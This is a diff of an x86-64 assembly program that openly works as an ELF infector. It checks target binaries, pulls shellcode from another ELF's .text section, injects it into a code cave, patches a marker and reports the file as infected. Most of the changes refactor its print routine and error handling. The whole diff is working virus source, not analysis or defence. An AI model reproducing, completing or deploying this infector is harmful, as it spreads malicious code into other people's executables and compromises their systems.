@@ -2,10 +2,20 @@
 %include "include/shared.s"
 
 ; TODO : might add a prolog even tho we don't use any variable so we don't have to push rbp every time (where ??)
+				; remake progress line : 276
+				; todo functions : all of them except print
+				; re-made functions : print
+; TODO : go to every `call print` and replace every r11 in `mov r11, STDOUT/STDERR`, with r11d (STDOUT/STDERR is 1 byte value) (this is done for now but check again in the future in case I added ne prints (I already know I'm gonna add one in good_elf_ptr))
+
+; TODO : do the same thing but this time with the return values from main (search every "; the return value" commend)
+
+; TODO : do the same with every other %definition in the include file (such as MAP_SHARED)
+
+; TODO : both filed should be MAP_PRIVATE in mmap:
 
 STRUC	stat
-	before_size:	resb	48 	; TODO : find the real sizes and offsets, these were just copied from 
-	st_size:	resq	1	; infect.s
+	before_size:	resb	48
+	st_size:	resq	1
 	stat_padding:	resb	88
 ENDSTRUC
 
@@ -27,31 +37,31 @@ STRUC Elf64_Ehdr
 ENDSTRUC
 
 STRUC Elf64_Shdr
-	sh_name		resd	1
-	sh_type		resd	1
-	sh_flags	resq	1
-	sh_addr		resq	1
-	sh_offset	resq	1
-	sh_size		resq	1
-	sh_link		resd	1
-	sh_info		resd	1
-	sh_addralign	resq	1
-	sh_entsize	resq	1
+	sh_name:	resd	1
+	sh_type:	resd	1
+	sh_flags:	resq	1
+	sh_addr:	resq	1
+	sh_offset:	resq	1
+	sh_size:	resq	1
+	sh_link:	resd	1
+	sh_info:	resd	1
+	sh_addralign:	resq	1
+	sh_entsize:	resq	1
 ENDSTRUC
 
 STRUC Elf64_Phdr
-	p_type		resd	1
-	p_offset	resd	1
-	p_vaddr		resq	1
-	p_paddr		resq	1
-	p_filesz	resq	1
-	p_memsz		resq	1
-	p_flags		resq	1
-	p_align		resq	1
+	p_type:		resd	1
+	p_offset:	resd	1
+	p_vaddr:	resq	1
+	p_paddr:	resq	1
+	p_filesz:	resq	1
+	p_memsz:	resq	1
+	p_flags:	resq	1
+	p_align:	resq	1
 ENDSTRUC
 
 section .bss
-	pivot_name:	resq	1
+	pivot_name:	resq	1	; the pivot's file name
 	pivot_fd:	resq	1
 	pivot_size:	resq	1
 	pivot_data:	resq	1	; pointer to mapped data
@@ -67,22 +77,23 @@ section .text
 	global _start
 
 _start:
-	cmp qword[rsp], 3
+	cmp qword[rsp], 3		; argc
 	je good_arg_count
 
-	mov r11, usage
-	mov r12, usage_len
+	mov r11d, STDERR
+	mov r12, usage
+	mov r13d, usage_len
 	call print
 	
-	mov r11, ERR_BAD_USAGE
+	mov r11d, ERR_BAD_USAGE		; the return value
 	call exit
 
 good_arg_count:
 	;; saving one file name for later
-	mov rax, [rsp + 0x10]	; pivot name
+	mov rax, [rsp + 0x10]		; pivot name
 	mov [pivot_name], rax
 
-	mov r11, [rsp + 0x18]	; elf name
+	mov r11, [rsp + 0x18]		; elf name
 
 	;;opening files
 	mov r12, O_RDONLY
@@ -102,21 +113,22 @@ next_open:
 	jns getting_sizes
 
 open_err:
-	mov r11, bad_open
-	mov r12, bad_open_len
-	call print		; "couldn't open file!"
+	mov r11d, STDERR
+	mov r12, bad_open
+	mov r13d, bad_open_len
+	call print			; "couldn't open file!"
 
-	mov r11d, ERR_BAD_OPEN	; the return value
+	mov r11d, ERR_BAD_OPEN		; the return value
 	;; deciding which file to clean
 	mov rax, [elf_fd]
 	test rax, rax
-	js exit			; no files have been opened
-	jmp close_elf		; elf was opened but pivot wasn't
+	js exit				; no files have been opened
+	jmp close_elf			; elf was opened but pivot wasn't
 
 getting_sizes:
-	mov r11, rax 		; pivot_fd
+	mov r11, rax	 		; pivot_fd
 	call get_file_size
-	test rax, rax		; pivot_size < 0 ?
+	test rax, rax			; pivot_size < 0 ?
 	jle file_size_err
 	mov [pivot_size], rax
 
@@ -124,7 +136,7 @@ next_size:
 	mov r11, [elf_fd]
 	call get_file_size
 	mov [elf_size], rax
-	test rax, rax		; elf_size < 0 ?
+	test rax, rax			; elf_size < 0 ?
 	jg mapping
 
 file_size_err:
@@ -141,29 +153,31 @@ file_size_err:
 	js failed_fstat
 
 an_empty_file:
-	mov r11, empty_file
-	mov r12, empty_file_len
-	call print		; "empty file!"
-	mov r11d, ERR_EMPTY_FILE; the return value
-	jmp close_files		; cleaning resources
+	mov r11d, STDERR
+	mov r12, empty_file
+	mov r13d, empty_file_len
+	call print			; "empty file!"
+
+	mov r11d, ERR_EMPTY_FILE	; the return value
+	jmp close_files			; cleaning resources
 
 failed_fstat:
-	mov r11d, ERR_BAD_FSTAT	; the return value
-	jmp close_files		; cleaning resources
+	mov r11d, ERR_BAD_FSTAT		; the return value
+	jmp close_files			; cleaning resources
 
 mapping:
-	mov r11, rax		; elf_size
+	mov r11, rax			; elf_size
 	mov r12, MAP_PRIVATE
 	mov r13, [elf_fd]
 	call mmap
 	mov [elf_data], eax
 
-	cmp rax, -1		; this can't be replaced with a test rax, rax
+	cmp rax, -1			; this can't be replaced with a test rax, rax
 	; if we jumped to mmap_err we have to figure out if we mapped any of the files correctly so
 	; we know if we should unmap them before exiting, for that I'll use ebx
 	; pivot wasn't mapped -> ebx = 1
 	; elf wasn't mapped -> ebx = 0
-	jns next_map
+	jne next_map
 	xor ebx, ebx
 	jmp mmap_err
 
@@ -174,28 +188,31 @@ next_map:
 	call mmap
 	mov [pivot_data], rax
 
-	cmp rax, -1		; this can't be replaced with a test rax, rax
+	cmp rax, -1			; this can't be replaced with a test rax, rax
 	jns after_mapping
 	mov ebx, 1
 
 mmap_err:
-	mov r11, ERR_BAD_MMAP
-	; ebx has a hint of what file filed to map
+	mov r11d, ERR_BAD_MMAP		; the return value
+	; ebx has a hint of what file failed to map
 	test ebx, ebx
-	jne close_files	; elf failed -> nothing was mapped -> close files an exit
-	jmp unmap_elf	; pivot mapped ->  elf was mappde -> unmap elf, close files then exit
+	je close_files			; elf failed -> nothing was mapped -> close files an exit
+	jmp unmap_elf			; pivot mapped ->  elf was mappde -> unmap elf, close files then exit
 
 after_mapping:
-	; next we have to check if the file we're infecting is 64 bit little endian, if not we exit
+	; next we have to check if both the target file and the payload are 64 bit little endian, if not we exit
 	mov r11, [pivot_data]
-	call is_target_elf	; returns -1 for false, 0 for true
-	je checking_infection	; we have the right file
+	call is_target_elf		; returns -1 for false, 0 for true
+	test rax, rax			; is this a good file ?
+	jne arch_err
 
-	mov r11, bad_64_bit_elf
-	mov r12, bad_64_bit_elf_len
-	call print		; "file is not a 64 bit elf!"
+	mov r11, [elf_data]
+	call is_target_elf
+	test rax, rax			; is this a good file ?
+	je checking_infection		; we have the right file
 
-	mov r11, ERR_NOT_TARGET
+arch_err:
+	mov r11d, ERR_NOT_TARGET	; the return value
 	jmp clean
 
 checking_infection:
@@ -211,28 +228,34 @@ checking_infection:
 	jne extract_shellcode
 
 	;; printing "$FILE_NAME is already infected"
-	;printing the file name
+	; printing the file name
 	mov r11, [pivot_name]
 	call strlen
-	mov r12, rax
+
+	mov r12, r11
+	mov r13, rax
+	mov r11d, STDERR
 	call print
 
 	; print the rest of the string
-	mov r11, infected
-	mov r12, infected_len
+	mov r11d, STDERR 
+	mov r12, infected
+	mov r13d, infected_len
 	call print
 
-	mov r11, ERR_INFECTED	; the return value
+	mov r11d, ERR_INFECTED		; the return value
 	jmp clean
 
 extract_shellcode:
 
 	mov r11, [elf_data]
 	mov r12, shellcode_size
-	call find_shell		; returns a pointer to the .text section, and initialiazes the shellcode_size variable
-	test rax, rax		; shellcode == NULL ?
+	call find_shell			; returns a pointer to the .text section, and initialiazes
+					; the shellcode_size variable
+
+	test rax, rax			; shellcode == NULL ?
 	jne next
-	mov r11, ERR_NO_SHELL	; the return value
+	mov r11d, ERR_NO_SHELL		; the return value
 	jmp clean
 
 next:
@@ -250,7 +273,7 @@ patching:
 	test rax, rax			; was the marker found and replaced ?
 	jns segments
 
-	mov r11, ERR_NO_MARKER		; the return value
+	mov r11d, ERR_NO_MARKER		; the return value
 	jmp clean			; marker wasn't found -> we can't continue the infection
 	
 segments:
@@ -328,8 +351,9 @@ next2:
 	;
 
 leaving_mark:
-	mov r11, marking
-	mov r12, marking_len
+	mov r11d, STDOUT
+	mov r12, marking
+	mov r13d, marking_len
 	call print		; "leaving mark .."
 	
 	mov rax, [pivot_data]
@@ -342,12 +366,16 @@ leaving_mark:
 
 	mov r11, [pivot_name]
 	call strlen
-	mov r12, rax
-	call print
 
-	mov r11, enjoy
-	mov r12, enjoy_len
-	call print
+	mov r12, r11
+	mov r13d, eax
+	mov r11d, STDOUT
+	call print		; $FILE
+
+	mov r11d, STDOUT
+	mov r12, enjoy
+	mov r13d, enjoy_len
+	call print		; " has been infected"
 
 	mov r11, SUCCESS	; the return value
 
@@ -407,9 +435,10 @@ mmap:	; void* mmap(QWORD size, int flags, int fd);
 	jne ret_mmap
 
 mapping_error:
-	mov eax, -1
-	mov r11, bad_mmap
-	mov r12, bad_mmap_len
+	mov eax, -1			; TODO : replace with rax ?
+	mov r11d, STDOUT
+	mov r12, bad_mmap
+	mov r13d, bad_mmap_len
 	call print
 	
 ret_mmap:
@@ -434,8 +463,9 @@ copying_loop:
 	jmp copying_loop
 
 copied:
-	mov r11, shell_copied
-	mov r12, shell_copied_len
+	mov r11d, STDOUT
+	mov r12, shell_copied
+	mov r13d, shell_copied_len
 	call print ; "shell copied!"
 	
 	pop rdi
@@ -510,8 +540,9 @@ reset_counter:
 	jmp parsing_data
 
 no_gap:
-	mov r11, no_gap_found
-	mov r12, no_gap_found_len
+	mov r11d, STDERR
+	mov r12, no_gap_found
+	mov r13d, no_gap_found_len
 	call print
 	xor eax, eax			; gap = NULL
 
@@ -548,8 +579,9 @@ marker_loop:
 	jns marker_loop; buff[0] is a valid qword as well
 
 no_mark_found:
-	mov r11, no_marker
-	mov r12, no_marker_len
+	mov r11d, STDERR
+	mov r12, no_marker
+	mov r13d, no_marker_len
 	call print
 	mov rax, -1	; returns FALSe
 	jmp ret_patch
@@ -628,8 +660,9 @@ parsing_loop:
 
 no_text_section:
 	xor eax, eax			; text = NULL
-	mov r11, no_text
-	mov r12, no_text_len
+	mov r11d, STDERR
+	mov r12, no_text
+	mov r13d, no_text_len
 	call print
 	sub rsp, 0x18
 	jmp ret_text_section
@@ -702,8 +735,9 @@ get_file_size:	; size_t get_file_size(int fd);
 	test rax, rax
 	jns after_stat		; TODO : rename this label ret_size
 
-	mov r11, bad_stat
-	mov r12, bad_stat_len
+	mov r11d, STDERR
+	mov r12, bad_stat
+	mov r13d, bad_stat_len
 	call print
 
 	mov rax, -1		; TODO:replace with `mov al, -1`, since rax but the LSB should be 0xffff.. already
@@ -714,19 +748,27 @@ after_stat:
 
 
 
-print:	; void print(char *msg);
+print:	; void print(int fd, char *buf, size_t len);
 
+
+	; saving used registers
 	push rax
-
-	xor rdi, rdi
-	xor eax, eax
-	mov rsi, r11
-	mov rdx, r12
-	inc rdi
-	inc al
+	push rdx
+	push rsi
+	push rdi
+	; performing the syscall
+	mov eax, 1
+	mov rdi, r11
+	mov rsi, r12
+	mov rdx, r13
 	syscall
+	; restoring saved registers
 
-	pop rax	
+	pop rdi
+	pop rsi
+	pop rdx
+	pop rax
+	
 	ret
 
 
@@ -758,8 +800,9 @@ is_target_elf:	; int is_target_elf(void *data);a
 	cmp dword[r11], 0x464c457f	; '\x7f' + "ELF"
 	je good_elf_ptr
 
-	mov r11, bad_elf
-	mov r12, bad_elf_len
+	mov r11d, STDERR
+	mov r12, bad_elf
+	mov r13d, bad_elf_len
 	call print
 	mov rax, -1
 	jmp ret_arch
